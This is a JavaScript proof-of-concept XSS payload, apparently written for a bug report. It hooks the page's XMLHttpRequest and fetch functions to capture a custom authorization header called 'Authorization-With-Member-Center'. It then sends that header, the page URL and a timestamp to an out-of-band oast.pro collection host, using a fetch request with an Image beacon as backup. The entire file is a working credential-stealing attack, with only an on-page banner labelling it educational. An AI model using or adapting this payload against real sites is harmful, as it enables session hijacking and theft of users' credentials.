(function() {
    'use strict';
    
    console.log('üîç XSS PoC');
    
    // Configuration
    const CONFIG = {
        exfilEndpoint: 'https://bfa3abbd803fabceead8g1mj3hayyyyyb.oast.pro',  // Replace with your RequestBin URL
        debug: true,
        targetHeader: 'Authorization-With-Member-Center'
    };

    /**
     * Intercept and collect Authorization header
     */
    function interceptAuthHeader() {
        let capturedHeader = null;
        
        // Method 1: Hook XMLHttpRequest
        const originalXHROpen = XMLHttpRequest.prototype.open;
        const originalXHRSend = XMLHttpRequest.prototype.send;
        const originalXHRSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
        
        const xhrHeaders = new WeakMap();
        
        XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
            if (!xhrHeaders.has(this)) {
                xhrHeaders.set(this, {});
            }
            xhrHeaders.get(this)[header] = value;
            
            if (header === CONFIG.targetHeader) {
                capturedHeader = value;
                if (CONFIG.debug) {
                    console.log(`üéØ Captured ${CONFIG.targetHeader} via XHR:`, value);
                }
            }
            
            return originalXHRSetRequestHeader.apply(this, arguments);
        };
        
        XMLHttpRequest.prototype.send = function() {
            const headers = xhrHeaders.get(this) || {};
            if (headers[CONFIG.targetHeader]) {
                capturedHeader = headers[CONFIG.targetHeader];
            }
            return originalXHRSend.apply(this, arguments);
        };
        
        // Method 2: Hook fetch
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const [url, options] = args;
            
            if (options && options.headers) {
                const headers = new Headers(options.headers);
                const authHeader = headers.get(CONFIG.targetHeader);
                
                if (authHeader) {
                    capturedHeader = authHeader;
                    if (CONFIG.debug) {
                        console.log(`üéØ Captured ${CONFIG.targetHeader} via fetch:`, authHeader);
                    }
                }
            }
            
            return originalFetch.apply(this, args);
        };
        
        return capturedHeader;
    }

    /**
     * Try to extract header from existing requests
     */
    function extractFromPerformance() {
        try {
            const entries = performance.getEntriesByType('resource');
            if (CONFIG.debug) {
                console.log(`üìä Found ${entries.length} resource entries`);
            }
            // Note: Performance API doesn't expose request headers
            // This is just for logging purposes
        } catch (e) {
            if (CONFIG.debug) {
                console.log('‚ö†Ô∏è Performance API not available');
            }
        }
    }

    /**
     * Collect data including auth header
     */
    function collectData(authHeader) {
        return {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            authHeader: authHeader || 'Not captured yet - waiting for requests',
            headerName: CONFIG.targetHeader
        };
    }

    /**
     * Send data via GET request
     */
    function sendData(authHeader) {
        const data = collectData(authHeader);
        
        // Encode data as URL parameters
        const params = new URLSearchParams({
            timestamp: data.timestamp,
            url: data.url,
            header_name: data.headerName,
            header_value: data.authHeader
        });
        
        const fullUrl = `${CONFIG.exfilEndpoint}?${params.toString()}`;
        
        if (CONFIG.debug) {
            console.log(`üì§ Sending GET request to ${CONFIG.exfilEndpoint}`);
            console.log(`üîë Auth Header: ${data.authHeader}`);
        }
        
        // Method 1: Using fetch
        fetch(fullUrl, {
            method: 'GET',
            mode: 'no-cors'
        })
        .then(() => {
            if (CONFIG.debug) {
                console.log('‚úÖ GET request sent via fetch');
            }
        })
        .catch(err => {
            if (CONFIG.debug) {
                console.log('‚ùå Fetch failed:', err.message);
            }
        });
        
        // Method 2: Using Image (backup method)
        const img = new Image();
        img.src = fullUrl;
        
        if (CONFIG.debug) {
            console.log('‚úÖ GET request sent via Image');
        }
    }

    /**
     * Monitor for the header and send when captured
     */
    function monitorAndSend() {
        let capturedHeader = null;
        let checkCount = 0;
        const maxChecks = 60; // Check for 60 seconds
        
        const checkInterval = setInterval(() => {
            checkCount++;
            
            // Try to get the header from intercepted requests
            const originalXHROpen = XMLHttpRequest.prototype.open;
            const originalXHRSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
            
            XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
                if (header === CONFIG.targetHeader && !capturedHeader) {
                    capturedHeader = value;
                    sendData(capturedHeader);
                    clearInterval(checkInterval);
                    if (CONFIG.debug) {
                        console.log('‚úÖ Header captured and sent!');
                    }
                }
                return originalXHRSetRequestHeader.apply(this, arguments);
            };
            
            // Stop after max checks
            if (checkCount >= maxChecks) {
                clearInterval(checkInterval);
                if (!capturedHeader) {
                    sendData('Header not found after 60 seconds');
                    if (CONFIG.debug) {
                        console.log('‚è±Ô∏è Timeout: Header not captured');
                    }
                }
            }
        }, 1000);
    }

    /**
     * Create visual alert
     */
    function createVisualAlert() {
        const alertBox = document.createElement('div');
        alertBox.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #ff4444, #cc0000);
            color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            z-index: 999999;
            font-family: monospace;
            max-width: 350px;
        `;
        alertBox.innerHTML = `
            <strong>‚ö†Ô∏è Header Exfiltration Active</strong><br>
            <small>Educational Security Demonstration</small><br>
            <small>Target: ${CONFIG.targetHeader}</small><br>
            <small>Method: GET Request</small><br>
            <button onclick="this.parentElement.remove()" style="margin-top:10px;padding:5px 10px;cursor:pointer;background:#fff;border:none;border-radius:4px;">
                Close
            </button>
        `;
        
        document.body.appendChild(alertBox);
        
        setTimeout(() => {
            if (alertBox.parentElement) {
                alertBox.remove();
            }
        }, 15000);
    }

    /**
     * Main execution
     */
    function execute() {
        console.log('üöÄ Starting Authorization Header Exfiltration...');
        
        try {
            // Set up header interception
            interceptAuthHeader();
            
            // Extract from performance API (if available)
            extractFromPerformance();
            
            // Monitor and send when captured
            monitorAndSend();
            
            // Show visual alert
            createVisualAlert();
            
            console.log(`‚úÖ Monitoring for ${CONFIG.targetHeader} header...`);
            console.log('üí° The header will be sent when the next API request is made');
            
        } catch (error) {
            console.error('‚ùå Error:', error);
        }
    }

    // Execute when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', execute);
    } else {
        execute();
    }

})();
